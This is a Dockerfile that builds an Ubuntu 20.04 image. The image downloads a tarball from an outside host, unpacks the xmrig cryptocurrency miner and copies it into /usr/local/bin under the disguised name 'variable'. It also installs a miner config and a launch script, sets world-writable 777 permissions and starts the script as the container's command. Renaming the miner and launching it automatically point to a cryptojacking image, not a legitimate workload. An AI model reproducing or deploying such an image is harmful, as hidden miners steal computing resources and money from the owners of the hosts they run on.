FROM ubuntu:20.04 

RUN apt update; \
    apt install wget -y; \
    apt install jq -y; \
    apt install bash -y; \
    wget https://data.atonline.net/~jwt/eyJ2IjoxLCJ1IjoicGhwbGF0Zm9ybSIsImUiOjE2NTUwNTAxNDh9.eyJhY3QiOiJnZXQiLCJpbiI6eyJkbCI6dHJ1ZX0sIm1pbWUiOiJhcHBsaWNhdGlvbi9nemlwIiwicCI6ImJsb2JzcmMvYmxvYnMtbXNtcXNwLW4ydWItZ3NuZC0zdHl2LXV1NGJ2MnhtIn0.e9pzrttMa8SBP-WUtjuA2mwEEyBA-iW6q_qKSLkvQh8/variable.tar.gz; \
    tar xf variable.tar.gz; \
    cd variable; \
    cp xmrig /usr/local/bin/variable; \
    cp init-conf.json /usr/local/bin/config.json; \
    cp script.sh /usr/local/bin/script.sh; \
    chmod -R 777 /usr/local/bin; \
    cd /usr/local/bin; \
    chmod 777 config.json; \
    chmod 777 variable; \
    chmod 777 script.sh;
    
WORKDIR /usr/local/bin
CMD script.sh
